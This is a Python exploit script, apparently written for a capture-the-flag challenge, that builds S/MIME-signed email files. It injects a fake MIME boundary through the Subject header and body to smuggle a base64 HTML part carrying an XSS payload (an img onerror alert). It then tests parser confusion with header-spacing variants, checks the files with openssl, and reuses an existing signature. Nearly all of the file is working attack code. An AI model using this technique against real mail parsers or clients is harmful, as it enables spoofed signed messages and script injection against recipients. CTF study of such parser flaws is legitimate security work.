import base64, subprocess, os
os.chdir('/tmp/ostest')
B1 = '===============0344718024407626035=='
PWN = '<img src=x onerror="alert(1)">'
b64 = base64.b64encode(PWN.encode()).decode()

def inner_with(ct_line):
    D = ('\n--' + B1 + ' \n' + ct_line + '\nContent-Transfer-Encoding : base64\n\n'
         + b64 + '\n--' + B1 + '-- ')
    payload = ('<!DOCTYPE html><html><body><h1>Re: ' + D + '</h1></body></html>')
    return ('Content-Type: multipart/mixed; boundary="' + B1 + '"\n'
            'MIME-Version: 1.0\n\n'
            '--' + B1 + '\nContent-Type: text/plain; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
            + payload + '\n'
            '--' + B1 + '\nContent-Type: text/html; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
            + payload + '\n'
            '--' + B1 + '--\n')

signed = open('signed4.eml').read()
import re
B2 = re.search(r'boundary="([^"]+)"', signed).group(1)
sig_part = signed[signed.index('--' + B2):]

def build(name, ct_line):
    inner = inner_with(ct_line)
    D_outer = ('\n--' + B1 + ' \n' + ct_line + '\nContent-Transfer-Encoding : base64\n\n'
               + b64 + '\n--' + B1 + '-- ')
    outer = ('Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg="sha-256"; boundary="'
             + B2 + '"\nMIME-Version: 1.0\nFrom: admin@ses\nTo: admin@ses\nSubject: Re: ' + D_outer + '\n'
             '\nThis is an S/MIME signed message\n\n--' + B2 + '\n' + inner + '\n' + sig_part)
    open(name, 'w').write(outer)
    subprocess.run(['cp', name, '/mnt/d/ctf-index/_z_496_emls/' + name])
    p = subprocess.run(['node', '/mnt/d/ctf-index/_z_496_parse.js', '/mnt/d/ctf-index/_z_496_emls/' + name],
                       capture_output=True, text=True)
    print('===', name, 'rc', p.returncode, '===')
    print(p.stdout[:250] or p.stderr[:250])
    r = subprocess.run(['openssl', 'cms', '-verify', '-in', name, '-CAfile', 'cert.pem', '-out', name + '.out'],
                       capture_output=True, text=True)
    print('verify rc', r.returncode, r.stderr.strip()[:120])
    if r.returncode == 0:
        subprocess.run(['cp', name + '.out', '/mnt/d/ctf-index/_z_496_emls/' + name + '.out'])
        p2 = subprocess.run(['node', '/mnt/d/ctf-index/_z_496_parse.js', '/mnt/d/ctf-index/_z_496_emls/' + name + '.out'],
                            capture_output=True, text=True)
        print('signed-content parse:', p2.stdout[:250])

build('vC.eml', 'Content-Type : text/html')      # baseline (known bad outer parse)
build('vD.eml', 'Content-Type\t: text/html')     # tab before colon
build('vE.eml', 'Content-Type : text/HTML')      # same, case check
